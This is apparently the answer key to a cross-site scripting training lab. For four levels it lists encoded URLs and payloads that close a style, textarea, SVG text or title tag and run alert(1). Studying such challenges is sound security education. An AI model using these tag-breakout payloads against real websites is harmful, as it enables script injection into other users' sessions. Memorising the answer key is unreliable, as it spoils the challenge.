# racecon — solutions

Reflections in special-tag contents (style, textarea, svg text, title).

### racecon-level1

`/racecon/level1/?query=%22%7D%3C%2Fstyle%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `"}</style><svg onload=alert(1)>`
- context: inside <style>body{font-family:"QUERY"}; close style

### racecon-level2

`/racecon/level2/?query=%3C%2Ftextarea%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</textarea><svg onload=alert(1)>`
- context: <textarea>QUERY</textarea>; close textarea

### racecon-level3

`/racecon/level3/?query=%3C%2Ftext%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `</text><script>alert(1)</script>`
- context: inside SVG <text>QUERY</text>; close text

### racecon-level4

`/racecon/level4/?query=%3C%2Ftitle%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</title><svg onload=alert(1)>`
- context: inside <title>QUERY</title>; close title
